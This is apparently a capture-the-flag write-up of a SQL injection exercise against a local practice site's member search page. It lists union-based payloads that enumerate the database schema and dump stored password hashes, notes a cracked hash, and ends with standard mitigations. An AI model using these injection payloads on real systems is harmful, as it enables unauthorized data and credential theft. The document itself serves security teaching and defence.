# Exploit

## Basic Mechanism

This vulnerability exploits an unsanitized search parameter in an image search feature:

1. The web application has a search feature for images
1. User input is directly incorporated into SQL queries without proper sanitization
1. An attacker can inject malicious SQL commands after legitimate input
1. The database executes these commands as if they were part of the original query
1. This allows the attacker to:
    - Extract database schema information
    - Access sensitive data
    - Potentially modify or delete data

## What can this do?

SQL injection vulnerabilities can have severe consequences:
- Bypass authentication
- Access sensitive data (user credentials, personal information)
- Extract database structure and contents
- Modify or delete data in the database
- Execute administrative operations on the database
- In some cases, gain control over the underlying server

## What we did

We first try some random inputs in `http://localhost:8080/?page=member` and we notice that we get sql error messages.
Then we have to follow these steps:
1. `1 ORDER BY 1` to `1 ORDER BY 3` to determine the number of columns
2. `1 union all select database(), version()` to get the database name and it's version
3. `1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()` to get the tables name
4. `1 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x7573657273` to get columns name
5. `1 union all select 1,group_concat(Commentaire,0x0a) from users` to check the content of that table
6. `1 union all select 1,group_concat(countersign,0x0a) from users` to get the password
7. `5ff9d0165b4f92b14994e5c685cdce28` we get this encrypted string that we decrypt to `FortyTwo`.
8. We know that the flag are `sha256` encrypted so we encrypt `fortytwo` using that algorithm

# Patch

- Use Parameterized Queries/Prepared Statements: Never concatenate user input directly into SQL
- Input Validation: Validate that inputs match expected formats (numbers, dates, etc.)
- ORM (Object-Relational Mapping): Use frameworks that handle SQL securely
- Least Privilege: Run database connections with minimal required permissions
- Web Application Firewall: Add an extra layer to filter malicious patterns
- Escape Special Characters: If parameterized queries aren't possible, escape inputs
- Error Handling: Don't expose SQL errors to users